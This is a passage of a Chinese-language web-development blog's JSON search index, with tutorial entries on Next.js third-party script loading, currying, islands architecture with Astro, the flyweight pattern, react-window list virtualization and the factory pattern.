Date();a=s.createElement(o),\rm=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\r})(window,document,\u0026#39;script\u0026#39;,\u0026#39;https://www.google-analytics.com/analytics.js\u0026#39;,\u0026#39;ga\u0026#39;);\rga(\u0026#39;create\u0026#39;, \u0026#39;UA-XXXXX-Y\u0026#39;, \u0026#39;auto\u0026#39;);\rga(\u0026#39;send\u0026#39;, \u0026#39;pageview\u0026#39;);\r`}\r\u0026lt;/Script\u0026gt;\r\u0026lt;/div\u0026gt;\r//Other UI related HTML\r)\r} import Script from \u0026#39;next/script\u0026#39;\r//other imports\rconst Home = () =\u0026gt; {\rreturn (\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;Script id=\u0026#34;google-analytics\u0026#34; strategy=\u0026#34;afterInteractive\u0026#34;\u0026gt;\r{`\r(function(i,s,o,g,r,a,m){i[\u0026#39;GoogleAnalyticsObject\u0026#39;]=r;i[r]=i[r]||function(){\r(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\rm=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\r})(window,document,\u0026#39;script\u0026#39;,\u0026#39;https://www.google-analytics.com/analytics.js\u0026#39;,\u0026#39;ga\u0026#39;);\rga(\u0026#39;create\u0026#39;, \u0026#39;UA-XXXXX-Y\u0026#39;, \u0026#39;auto\u0026#39;);\rga(\u0026#39;send\u0026#39;, \u0026#39;pageview\u0026#39;);\r`}\r\u0026lt;/Script\u0026gt;\r\u0026lt;/div\u0026gt;\r//Other UI related HTML\r)\r}\rexport default Home 请注意，在上面的两个示例中，分析脚本加载了 strategy = afterInteractive。\n\r结论 在将来自服务器的资源与来自 Web 其他角落的资源组合起来编写网页时，必须经常监视这些资源之间的相互作用。\n可以从正确排序资源并遵循最佳实践开始。 还可以依赖在设计中内置了这些最佳实践的框架或解决方案。\n随着站点的发展，性能报告和定期审计可以帮助消除冗余并优化影响性能的脚本。\n最后，我们总是希望有众所周知的性能问题的第三方会在他们的最后优化代码或公开 API 以启用变通方法来解决这些问题。\n\r知识点   Next.s\n  Partytown\n  ","description":"减少第三方脚本对网站的性能影响。","id":127,"section":"react-patterns","tags":null,"title":"优化加载第三方","uri":"https://codthing.github.io/react-patterns/performance-patterns/third-party/"},{"content":"arity（参数个数）是函数所需的形参的数量。 函数柯里化（Currying）意思是把接受多个 arity 的函数变换成接受单一 arity 的函数。\n\r函数柯里化 arity（参数个数）是函数所需的形参的数量。 函数柯里化（Currying）意思是把接受多个 arity 的函数变换成接受单一 arity 的函数。\n换句话说，就是重构函数让它接收一个参数，然后返回接收下一个参数的函数，依此类推。\n1 2 3 4 5 6 7 8 9 10 11 12 13  function unCurried(x, y) { return x + y; } function curried(x) { return function(y) { return x + y; } } const curried = x =\u0026gt; y =\u0026gt; x + y curried(1)(2) // 3   柯里化在不能一次为函数提供所有参数情况下很有用。\n因为它可以将每个函数的调用保存到一个变量中，该变量将保存返回的函数引用，该引用在下一个参数可用时接受该参数。\n下面是使用柯里化函数的例子：\n1 2  const funcForY = curried(1); console.log(funcForY(2)); // 3   局部调用 类似地，**局部调用（ partial application）**的意思是一次对一个函数应用几个参数，然后返回另一个应用更多参数的函数。\n这是一个示例：\n1 2 3 4 5 6  function impartial(x, y, z) { return x + y + z; } const partialFn = impartial.bind(this, 1, 2); partialFn(10); // 13   填写 add 函数主体部分，用柯里化添加参数 x，y 和 z.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  function add(x) { // return function (y) {  // return function (z) {  // return x + y + z;  // };  // };  // 或者  return y =\u0026gt; z =\u0026gt; x + y + z; } add(10)(20)(30); // 60   ","description":"arity（参数个数）是函数所需的形参的数量。 函数柯里化（Currying）意思是把接受多个 arity 的函数变换成接受单一 arity 的函数。","id":128,"section":"javascript","tags":null,"title":"函数柯里化和局部调用","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/currying-programming/"},{"content":"岛屿架构鼓励在服务器渲染的网页中进行小的、集中的交互块。\n岛屿的输出是逐步增强的 HTML，在增强发生的方式上具有更多的特异性。\n不是单个应用程序控制整页呈现，而是有多个入口点。\n这些交互性“孤岛”的脚本可以独立交付和水合，允许页面的其余部分只是静态 HTML。\n加载和处理过多的 JavaScript 会影响性能。 但是，通常需要一定程度的交互性和 JavaScript，即使在主要是静态网站中也是如此。\n我们已经讨论了服务器端渲染 (SSR) 的变体，这些变体使您能够构建尝试在以下各项之间找到平衡的应用程序：\n  与客户端渲染 (CSR) 应用程序相当的交互性\n  与 SSR 应用程序相当的 SEO 优势\n  SSR 的核心原则是 HTML 在服务器上呈现，并附带必要的 JavaScript，以便在客户端对其重新水合。\nRehydration 是在服务端渲染后在客户端重新生成 UI 组件状态的过程。\n由于再水化是有代价的，SSR 的每个变体都试图优化再水化过程。\n这主要是通过关键组件的部分水合或组件在渲染时的流来实现的。\n然而，在上述技术中最终交付的网络 JavaScript 保持不变。\n\r岛屿架构 岛屿架构一词由 Katie Sylor-Miller 和 Jason Miller 推广，用来描述一种范式，旨在减少通过交互“孤岛”传输的 JavaScript 量，这些交互“孤岛”可以在其他静态 HTML 之上独立交付。\n孤岛是一种基于组件的体系结构，它建议使用静态和动态孤岛来划分页面视图。\n  页面的静态区域是纯非交互式 HTML，不需要加水。\n  动态区域是 HTML 和脚本的组合，能够在渲染后自我修复。\n  让我们通过目前可用的不同选项来更详细地探索 Islands 架构。\n\r动态组件岛 大多数页面是静态和动态内容的组合。 通常，一个页面由静态内容和一些可以隔离的交互区域组成。 例如;\n  博客文章、新闻文章和组织主页包含文本和图像以及社交媒体嵌入和聊天等交互式组件。\n  电子商务网站上的产品页面包含静态产品描述和应用程序其他页面的链接。 图像轮播和搜索等交互组件可在页面的不同区域使用。\n  一个典型的银行账户详细信息页面包含一个静态交易列表，带有提供一些交互性的过滤器。\n  静态内容是无状态的，不会触发事件，并且在渲染后不需要重新水化。\n渲染后，动态内容（按钮、过滤器、搜索栏）必须重新连接到其事件。 DOM 必须在客户端（虚拟 DOM）重新生成。 这种再生、再水化和事件处理功能有助于将 JavaScript 发送到客户端。\nIslands 架构有助于在服务器端呈现页面及其所有静态内容。 但是，在这种情况下，呈现的 HTML 将包含动态内容的占位符。 动态内容占位符包含自包含的组件小部件。 每个小部件类似于一个应用程序，并结合了服务器渲染的输出和用于在客户端上为应用程序添加水的 JavaScript。\n在渐进式补水中，页面的补水架构是自上而下的。 该页面控制各个组件的调度和水合。 每个组件在 Islands 架构中都有自己的 hydration 脚本，该脚本异步执行，独立于页面上的任何其他脚本。 一个组件中的性能问题不应影响另一个。\n\r实施岛 Island 架构借鉴了不同来源的概念，旨在将它们优化组合。 Jekyll 和 Hugo 等基于模板的静态站点生成器支持将静态组件渲染到页面。 大多数现代 JavaScript 框架还支持同构渲染，这允许您使用相同的代码在服务器和客户端上渲染元素。\nJason 的帖子建议使用 requestIdleCallback() 来实现一种用于补水组件的调度方法。 可以将组件级部分水化的静态同构渲染和调度构建到框架中以支持岛屿架构。 因此，该框架应\n  支持在服务器上使用零 JavaScript 静态呈现页面。\n  支持通过静态内容中的占位符嵌入独立的动态组件。 每个动态组件都包含它的脚本，一旦主线程空闲，就可以使用 requestIdleCallback() 将其自身水化。\n  允许同构渲染服务器上的组件与客户端的 hydration 以识别两端的相同组件。\n  可以使用下面讨论的开箱即用选项之一来实现这一点。\n架构 如今，不同的框架都能够支持 Islands 架构。 其中值得注意的是\n Marko：  Marko 是一个由 eBay 开发和维护的开源框架，用于提高服务器渲染性能。\n它通过将流式渲染与自动部分水化相结合来支持岛屿架构。 HTML 和其他静态资产一准备好就流式传输到客户端。自动部分水合允许交互式组件自行水合。\nHydration 代码仅用于交互式组件，可以更改浏览器上的状态。它是同构的，并且 Marko 编译器会根据它将运行的位置（客户端或服务器）生成优化的代码。\nAstro：  Astro 是一个静态站点构建器，可以从 React、Preact、Svelte、Vue 等其他框架中构建的 UI 组件生成轻量级静态 HTML 页面。\n需要客户端 JavaScript 的组件与其依赖项单独加载。因此，它提供了内置的部分水合作用。 Astro 还可以延迟加载组件，具体取决于它们何时可见。我们在下一节中包含了一个使用 Astro 的示例实现。\nEleventy + Preact：  Markus Oberlehner 演示了 Eleventy 的使用，这是一个静态站点生成器，具有可以部分水合的同构 Preact 组件。\n它还支持懒惰的水合作用。组件本身声明性地控制组件的水合作用。交互式组件使用 WithHydration 包装器，以便它们在客户端上水合。\n请注意，Marko 和 Eleventy 早于 Jason 提供的岛屿定义，但包含支持它所需的一些功能。 然而，Astro 是基于定义构建的，并且本质上支持 Islands 架构。\n在下一节中，我们将演示如何在前面讨论的简单博客页面示例中使用 Astro。\n\r示例实现 以下是使用 Astro 实现的示例博客页面。 SamplePost 页面导入了一个交互式组件 SocialButtons。 该组件通过标记包含在 HTML 中所需的位置。\nAstro page (SamplePost.astro)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  --- // Component Imports import { SocialButtons } from \u0026#39;../../components/SocialButtons.tsx\u0026#39;; --- \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/blog.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;layout\u0026#34;\u0026gt; \u0026lt;article class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;section class=\u0026#34;intro\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;title\u0026#34;\u0026gt;Post title (static)\u0026lt;/h1\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;p\u0026gt;Post sub-title (static)\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;intro\u0026#34;\u0026gt; \u0026lt;p\u0026gt;This is the post content with images that is rendered by the server.\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/user/c_v_r/200x200\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;The next section contains the interactive social buttons component which includes its script.\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;social\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;SocialButtons client:visible\u0026gt;\u0026lt;/SocialButtons\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/article\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   SocialButtons 组件是一个 Preact 组件，带有它的 HTML 和相应的事件处理程序。\nSocialButtons component (SocialButtons.tsx)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import { useState } from \u0026#39;preact/hooks\u0026#39;; /** a counter written in Preact */ export function SocialButtons() { const [count, setCount] = useState(0); const add = () =\u0026gt; setCount((i) =\u0026gt; i + 1); const subtract = () =\u0026gt; setCount((i) =\u0026gt; i - 1); return ( \u0026lt;\u0026gt; \u0026lt;div\u0026gt; {count} people liked this post \u0026lt;/div\u0026gt; \u0026lt;div align=\u0026#34;right\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/like.png\u0026#34; width=\u0026#34;32\u0026#34; height=\u0026#34;32\u0026#34; onclick={add}\u0026gt;\u0026lt;/img\u0026gt; \u0026lt;img src=\u0026#34;/unlike.png\u0026#34; width=\u0026#34;32\u0026#34; height=\u0026#34;32\u0026#34; onclick={subtract}\u0026gt;\u0026lt;/img\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/\u0026gt; ); }   该组件在运行时嵌入到页面中，并在客户端水合，以便单击事件按需要运行。\nAstro 允许 HTML、CSS 和脚本之间的清晰分离，并鼓励基于组件的设计。 使用此框架可以轻松安装和开始构建网站。\n\r优缺点 Islands 架构结合了来自不同渲染技术的想法，例如服务器端渲染、静态站点生成和部分水化。 实施孤岛的一些潜在好处如下。\n 性能：  减少传送到客户端的 JavaScript 代码量。 发送的代码仅包含交互组件所需的脚本，远少于重新创建整个页面的虚拟 DOM 和重新水化页面上所有元素所需的脚本。 JavaScript 的较小尺寸自动对应于更快的页面加载和可交互时间 (TTI)。\n  Astro 与为 Next.js 和 Nuxt.js 创建的文档网站的比较显示 JavaScript 代码减少了 83%。 其他用户也报告了 Astro 的性能改进。\n  SEO：由于所有静态内容都在服务器上呈现； 页面是 SEO 友好的。\n  优先考虑重要内容：用户几乎可以立即获得关键内容（尤其是博客、新闻文章和产品页面）。 在消费关键内容逐渐可用后，通常需要用于交互的辅助功能。\n  可访问性：使用标准静态 HTML 链接访问其他页面有助于提高网站的可访问性。\n  基于组件：该架构提供了基于组件架构的所有优点，例如可重用性和可维护性。\n  尽管有这些优势，但该概念仍处于起步阶段。 有限的支持导致一些缺点。\n  开发人员实现 Islands 的唯一选择是使用少数可用的框架之一或自己开发架构。 将现有站点迁移到 Astro 或 Marko 需要额外的努力。\n  除了 Jason 的初始帖子，几乎没有关于这个想法的讨论。\n  新框架声称支持 Islands 架构，因此很难过滤出适合您的架构。\n  该架构不适合高度交互的页面，例如可能需要数千个岛屿的社交媒体应用程序。\n  Islands 架构概念相对较新，但由于其性能优势可能会加快速度。 它强调使用 SSR 来呈现静态内容，同时通过动态组件支持交互性，同时对页面性能的影响最小。 我们希望未来在这个领域看到更多的参与者，并有更多的实施选项可供选择。\n\r\r知识点    ","description":"岛屿架构鼓励在服务器渲染的网页中进行小的、集中的交互块","id":129,"section":"react-patterns","tags":null,"title":"岛屿架构 ✔","uri":"https://codthing.github.io/react-patterns/render-patterns/islands-architecture/"},{"content":"当创建大量相似的对象时，享元模式是一种节省内存的有用方法。\n\r图书馆案例 在应用程序中，我们希望用户能够添加书籍。 所有的书都有书名、作者和书号！ 但是，图书馆通常不会只有一本书的副本：它通常有同一本书的多个副本。\n如果完全相同的书有多个副本，则每次都创建一个新书实例并不是很有用。 相反，我们想要创建 Book 构造函数的多个实例，代表一本书。\nclass Book {\rconstructor(title, author, isbn) {\rthis.title = title;\rthis.author = author;\rthis.isbn = isbn;\r}\r} 让我们创建将新书添加到列表中的功能。\n如果一本书具有相同的 ISBN 号，因此是完全相同的书籍类型，我们不想创建一个全新的 Book 实例。\n相反，我们应该首先检查这本书是否已经存在。\n1 2 3 4 5 6 7 8 9 10  const isbnNumbers = new Set(); //允许存储任何类型的唯一值，无论是原始值或者是对象引用  const createBook = (title, author, isbn) =\u0026gt; { const book = isbnNumbers.has(isbn); if (book) { return book; } };   如果它还不包含书的 ISBN 号，我们将创建一个新书并将其 ISBN 号添加到 isbnNumbers 集。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  const isbnNumbers = new Set(); const createBook = (title, author, isbn) =\u0026gt; { const book = isbnNumbers.has(isbn); if (book) { return book; } const book = new Book(title, author, isbn); isbnNumbers.add(isbn); return book; };   createBook 函数帮助我们创建一种类型书籍的新实例。 但是，图书馆通常包含同一本书的多个副本！\n创建一个 addBook 函数，它允许添加同一本书的多个副本。 它应该调用 createBook 函数，该函数返回一个新创建的 Book 实例，或者返回已经存在的实例。\n为了跟踪副本总数，让我们创建一个 bookList 数组，其中包含图书馆中的图书总数。\nconst bookList = [];\rconst addBook = (title, author, isbn, availibility, sales) =\u0026gt; {\rconst book = {\r...createBook(title, author, isbn),\rsales,\ravailibility,\risbn\r};\rbookList.push(book);\rreturn book;\r}; Perfect！ 不是每次添加副本时都创建一个新的 Book 实例，可以有效地将已经存在的 Book 实例用于该特定副本。\n让我们制作 3 本书的 5 份副本：《哈利波特》、《杀死一只知更鸟》和《了不起的盖茨比》。\naddBook(\u0026#34;Harry Potter\u0026#34;, \u0026#34;JK Rowling\u0026#34;, \u0026#34;AB123\u0026#34;, false, 100);\raddBook(\u0026#34;Harry Potter\u0026#34;, \u0026#34;JK Rowling\u0026#34;, \u0026#34;AB123\u0026#34;, true, 50);\raddBook(\u0026#34;To Kill a Mockingbird\u0026#34;, \u0026#34;Harper Lee\u0026#34;, \u0026#34;CD345\u0026#34;, true, 10);\raddBook(\u0026#34;To Kill a Mockingbird\u0026#34;, \u0026#34;Harper Lee\u0026#34;, \u0026#34;CD345\u0026#34;, false, 20);\raddBook(\u0026#34;The Great Gatsby\u0026#34;, \u0026#34;F. Scott Fitzgerald\u0026#34;, \u0026#34;EF567\u0026#34;, false, 20); 虽然有 5 个副本，但我们只有 3 个 Book 实例！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  class Book { constructor(title, author, isbn) { this.title = title; this.author = author; this.isbn = isbn; } } const isbnNumbers = new Set(); const bookList = []; const addBook = (title, author, isbn, availibility, sales) =\u0026gt; { const book = { ...createBook(title, author, isbn), sales, availibility, isbn }; bookList.push(book); return book; }; const createBook = (title, author, isbn) =\u0026gt; { const book = isbnNumbers.has(isbn); if (book) { return book; } else { const book = new Book(title, author, isbn); isbnNumbers.add(isbn); return book; } }; addBook(\u0026#34;Harry Potter\u0026#34;, \u0026#34;JK Rowling\u0026#34;, \u0026#34;AB123\u0026#34;, false, 100); addBook(\u0026#34;Harry Potter\u0026#34;, \u0026#34;JK Rowling\u0026#34;, \u0026#34;AB123\u0026#34;, true, 50); addBook(\u0026#34;To Kill a Mockingbird\u0026#34;, \u0026#34;Harper Lee\u0026#34;, \u0026#34;CD345\u0026#34;, true, 10); addBook(\u0026#34;To Kill a Mockingbird\u0026#34;, \u0026#34;Harper Lee\u0026#34;, \u0026#34;CD345\u0026#34;, false, 20); addBook(\u0026#34;The Great Gatsby\u0026#34;, \u0026#34;F. Scott Fitzgerald\u0026#34;, \u0026#34;EF567\u0026#34;, false, 20); console.log(\u0026#34;Total amount of copies: \u0026#34;, bookList.length); // Total amount of copies: 5 console.log(\u0026#34;Total amount of books: \u0026#34;, isbnNumbers.size); // Total amount of books: 3   \r优点 当您创建大量对象时，这可能会耗尽所有可用 RAM。\n享元模式很有用，它使我们能够最大限度地减少消耗的内存量。\n如今，硬件具有 GB 的 RAM，这使得享元模式变得不那么重要。\n在 JavaScript 中，我们可以通过原型继承轻松解决这个问题。\n\r知识点  Set() - Set 对象允许存储任何类型的唯一值，无论是原始值或者是对象引用。  ","description":"处理相同对象时重用现有实例","id":130,"section":"react-patterns","tags":null,"title":"亨元模式","uri":"https://codthing.github.io/react-patterns/design-patterns/flyweight-pattern/"},{"content":"在本指南中，讨论列表虚拟化（也称为窗口化）。\n这是在动态列表中仅呈现可见内容行而不是整个列表的想法。\n呈现的行只是完整列表的一小部分，随着用户滚动可见（窗口）移动。 这可以提高渲染性能。\n如果使用 React 并且需要高效地显示大量数据列表，\n您可能熟悉 react-virtualized。 它是 Brian Vaughn 的一个窗口库，它只呈现列表中当前可见的项目（在滚动“视口”中）。\n这意味着无需支付一次呈现数千行数据的成本。 这篇文章随附了带有 react-window 的列表虚拟化视频演练。\n\r列表虚拟化如何工作？ “虚拟化”项目列表涉及维护一个窗口并在列表中移动该窗口。\n通过以下方式在反应虚拟化工作中开窗：\n  具有相对定位（窗口）的小型容器 DOM 元素（例如 \u0026lt;ul\u0026gt;）\n  有一个用于滚动的大 DOM 元素\n  绝对将孩子定位在容器内，设置他们的顶部、左侧、宽度和高度的样式\n  虚拟化不是一次渲染列表中的 1000 个元素（这会导致初始渲染变慢或影响滚动性能），\n而是专注于仅渲染用户可见的项目。\n这有助于在中低端设备上保持快速的列表渲染。\n可以在用户滚动时获取/显示更多项目，卸载以前的条目并用新条目替换它们。\n\rreact-virtualized 的较小替代方案 react-window 是同一作者对 react-virtualized 的重写，旨在更小、更快和更易摇树。\n使用它代替 react-virtualized 可以节省大约 20-30KB（gzipped）：\n这两个包的 API 相似，但在不同的地方，react-window 往往更简单。\nreact-window 的组件包括：\nList 列表呈现元素的窗口列表（行），这意味着仅向用户显示可见行（例如 FixedSizeList、VariableSizeList）。\n列表使用 Grid（内部）来呈现行，将道具中继到该内部网格。\n使用 React 渲染数据列表\n这是使用 React 渲染简单数据列表 (itemsArray) 的示例：\nimport React from \u0026#34;react\u0026#34;;\rimport ReactDOM from \u0026#34;react-dom\u0026#34;;\rconst itemsArray = [\r{ name: \u0026#34;Drake\u0026#34; },\r{ name: \u0026#34;Halsey\u0026#34; },\r{ name: \u0026#34;Camillo Cabello\u0026#34; },\r{ name: \u0026#34;Travis Scott\u0026#34; },\r{ name: \u0026#34;Bazzi\u0026#34; },\r{ name: \u0026#34;Flume\u0026#34; },\r{ name: \u0026#34;Nicki Minaj\u0026#34; },\r{ name: \u0026#34;Kodak Black\u0026#34; },\r{ name: \u0026#34;Tyga\u0026#34; },\r{ name: \u0026#34;Buno Mars\u0026#34; },\r{ name: \u0026#34;Lil Wayne\u0026#34; }, ...\r]; // our data\rconst Row = ({ index, style }) =\u0026gt; (\r\u0026lt;div className={index % 2 ? \u0026#34;ListItemOdd\u0026#34; : \u0026#34;ListItemEven\u0026#34;} style={style}\u0026gt;\r{itemsArray[index].name}\r\u0026lt;/div\u0026gt;\r);\rconst Example = () =\u0026gt; (\r\u0026lt;div\rstyle=\rclass=\u0026#34;List\u0026#34;\r\u0026gt;\r{itemsArray.map((item, index) =\u0026gt; Row({ index }))}\r\u0026lt;/div\u0026gt;\r);\rReactDOM.render(\u0026lt;Example /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); 使用 react-window 渲染列表\n\u0026hellip;这里是使用 react-window 的 FixedSizeList 的相同示例，它需要一些道具（width、height、itemCount、itemSize）和作为子项传递的行渲染函数：\nimport React from \u0026#34;react\u0026#34;;\rimport ReactDOM from \u0026#34;react-dom\u0026#34;;\rimport { FixedSizeList as List } from \u0026#34;react-window\u0026#34;;\rconst itemsArray = [...]; // our data\rconst Row = ({ index, style }) =\u0026gt; (\r\u0026lt;div className={index % 2 ? \u0026#34;ListItemOdd\u0026#34; : \u0026#34;ListItemEven\u0026#34;} style={style}\u0026gt;\r{itemsArray[index].name}\r\u0026lt;/div\u0026gt;\r);\rconst Example = () =\u0026gt; (\r\u0026lt;List\rclassName=\u0026#34;List\u0026#34;\rheight={150}\ritemCount={itemsArray.length}\ritemSize={35}\rwidth={300}\r\u0026gt;\r{Row}\r\u0026lt;/List\u0026gt;\r);\rReactDOM.render(\u0026lt;Example /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); Grid Grid 使用虚拟化沿垂直和水平轴呈现表格数据（例如 FizedSizeGrid、VariableSizeGid）。\n它仅根据当前的水平/垂直滚动位置呈现填充自身所需的 Grid 单元格。\n如果想用 Grid 布局呈现与之前相同的列表，假设我们的输入是一个多维数组，可以使用 FixedSizeGrid 完成此操作，如下所示：\nimport React from \u0026#39;react\u0026#39;;\rimport ReactDOM from \u0026#39;react-dom\u0026#39;;\rimport { FixedSizeGrid as Grid } from \u0026#39;react-window\u0026#39;;\rconst itemsArray = [\r[{},{},{},...],\r[{},{},{},...],\r[{},{},{},...],\r[{},{},{},...],\r]; const Cell = ({ columnIndex, rowIndex, style }) =\u0026gt; (\r\u0026lt;div\rclassName={\rcolumnIndex % 2\r? rowIndex % 2 === 0\r? \u0026#39;GridItemOdd\u0026#39;\r: \u0026#39;GridItemEven\u0026#39;\r: rowIndex % 2\r? \u0026#39;GridItemOdd\u0026#39;\r: \u0026#39;GridItemEven\u0026#39;\r}\rstyle={style}\r\u0026gt;\r{itemsArray[rowIndex][columnIndex].name}\r\u0026lt;/div\u0026gt;\r);\rconst Example = () =\u0026gt; (\r\u0026lt;Grid\rclassName=\u0026#34;Grid\u0026#34;\rcolumnCount={5}\rcolumnWidth={100}\rheight={150}\rrowCount={5}\rrowHeight={35}\rwidth={300}\r\u0026gt;\r{Cell}\r\u0026lt;/Grid\u0026gt;\r);\rReactDOM.render(\u0026lt;Example /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;)); 更深入的 react-window 示例 Scott Taylor 使用 react-window 和 FixedSizeGrid 实现了一个开源的 Pitchfork 音乐评论抓取工具 (src)。\nPitchfork scraper 使用 react-window-infinite-loader，它有助于将大型数据集分解为可以在滚动到视图中时加载的块。\n以下是如何将 react-window-infinite-loader 纳入此应用程序的片段：\nimport React, { Component } from \u0026#39;react\u0026#39;;\rimport { FixedSizeGrid as Grid } from \u0026#39;react-window\u0026#39;;\rimport InfiniteLoader from \u0026#39;react-window-infinite-loader\u0026#39;;\r...\rrender() {\rreturn (\r\u0026lt;InfiniteLoader\risItemLoaded={this.isItemLoaded}\rloadMoreItems={this.loadMoreItems}\ritemCount={this.state.count + 1}\r\u0026gt;\r{({ onItemsRendered, ref }) =\u0026gt; (\r\u0026lt;Grid\ronItemsRendered={this.onItemsRendered(onItemsRendered)}\rcolumnCount={COLUMN_SIZE}\rcolumnWidth={180}\rheight={800}\rrowCount={Math.max(this.state.count / COLUMN_SIZE)}\rrowHeight={220}\rwidth={1024}\rref={ref}\r\u0026gt;\r{this.renderCell}\r\u0026lt;/Grid\u0026gt;\r)}\r\u0026lt;/InfiniteLoader\u0026gt;\r);\r}\r} 您可能会发现从 react-virtualized 移植应用程序的提交很有用。\n使用 FixedSizeList 的 Pitchfork 抓取器的实现也是可用的（Pixel 上的 demo）：\n这是实现的一个片段：\nreturn (\r\u0026lt;InfiniteLoader\risItemLoaded={this.isItemLoaded}\rloadMoreItems={this.loadMoreItems}\ritemCount={this.state.count}\r\u0026gt;\r{({ onItemsRendered, ref }) =\u0026gt; (\r\u0026lt;section\u0026gt;\r\u0026lt;FixedSizeList\ritemCount={this.state.count}\ritemSize={ROW_HEIGHT}\ronItemsRendered={onItemsRendered}\rheight={this.state.height}\rwidth={this.state.width}\rref={ref}\r\u0026gt;\r{this.renderCell}\r\u0026lt;/FixedSizeList\u0026gt;\r\u0026lt;/section\u0026gt;\r)}\r\u0026lt;/InfiniteLoader\u0026gt;\r); 如果我们对 Grid 虚拟化解决方案有更复杂的需求怎么办？\n我们发现了一个 The Movie Database 演示应用程序，它在后台使用了 react-virtualized 和 Infinite Loader。\n将它移植到 react-window 和 react-window-infinite-loader 并没有花很长时间，但我们确实发现一些组件尚不受支持。 无论如何，最终的功能非常接近。\n将它移植到 react-window 和 react-window-infinite-loader 并没有花很长时间，但我们确实发现一些组件尚不受支持。 无论如何，最终的功能非常接近。\n缺少的组件是 WindowScroller 和 AutoSizer……我们接下来会看到它们。\n...\rreturn (\r\u0026lt;section\u0026gt;\r\u0026lt;AutoSizer disableHeight\u0026gt;\r{({width}) =\u0026gt; {\rconst {movies, hasMore} = this.props;\rconst rowCount = getRowsAmount(width, movies.length, hasMore);\r...\rreturn (\r\u0026lt;InfiniteLoader\rref={this.infiniteLoaderRef}\r...\r{({onRowsRendered, registerChild}) =\u0026gt; (\r\u0026lt;WindowScroller\u0026gt;\r{({height, scrollTop}) =\u0026gt; ( react-window 缺少什么？ react-window 还没有 react-virtualized 的完整 API 表面，所以如果考虑它，请检查比较文档。 缺少了什么？\n  WindowScroller - 这是一个 react-virtualized 组件，可以根据窗口的滚动位置滚动列表。 目前没有计划为 react-window 实现此功能，因此您需要在用户空间中解决此问题。\n  AutoSizer - HOC 可以适应所有可用空间，自动调整单个孩子的宽度和高度。 Brian 将其作为一个独立的包来实现。 关注此问题以获取最新信息。\n  CellMeasurer - HOC 通过以用户不可见的方式呈现单元格的内容来自动测量单元格的内容。 在此处关注有关支持的讨论。\n  也就是说，我们发现 react-window 开箱即用，足以满足我们的大部分需求。\n\r网络平台的改进 一些现代浏览器现在支持 CSS 内容可见性。\ncontent-visibility:auto 允许您跳过渲染和绘制屏幕外内容，直到需要为止。\n如果您的 HTML 文档很长且渲染成本很高，请考虑尝试使用该属性。\n对于渲染动态内容列表，我仍然建议使用像 react-window 这样的库。\n很难拥有这样一个库的 content-visbility:hidden 版本，它可以像今天许多列表虚拟化库那样在屏幕外积极使用 display:none 或删除 DOM 节点来击败一个版本。\n\r进一步阅读 如需进一步了解 react-window 和 react-virtualized，请查看：\n  使用 react-window 渲染性能列表\n  使用窗口创建更高效的 React 视图\n  使用 react-virtualized 渲染列表\n  使用 react-virtualized 渲染大型列表\n  \r知识点    ","description":"使用列表虚拟化优化列表性能","id":131,"section":"react-patterns","tags":null,"title":"列表虚拟化","uri":"https://codthing.github.io/react-patterns/performance-patterns/virtual-lists/"},{"content":"使用工厂模式，我们可以使用工厂函数来创建新对象。\n当一个函数在不使用 new 关键字的情况下返回一个新对象时，它就是一个工厂函数！\n\r用户案例 假设我们的应用程序需要很多用户。\n我们可以使用 firstName、lastName 和 email 属性创建新用户。\n工厂函数还向新创建的对象添加了 fullName 属性，该属性返回 firstName 和 lastName。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  const createUser = ({ firstName, lastName, email }) =\u0026gt; ({ firstName, lastName, email, fullName() { return `${this.firstName}${this.lastName}`; } }); const user1 = createUser({ firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, email: \u0026#34;john@doe.com\u0026#34; }); const user2 = createUser({ firstName: \u0026#34;Jane\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, email: \u0026#34;jane@doe.com\u0026#34; }); console.log(user1); // {firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, email: \u0026#34;john@doe.com\u0026#34;, fullName: ƒ fullName()} console.log(user2); // {firstName: \u0026#34;Jane\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, email: \u0026#34;jane@doe.com\u0026#34;, fullName: ƒ fullName()}   Perfect! 通过调用 createUser 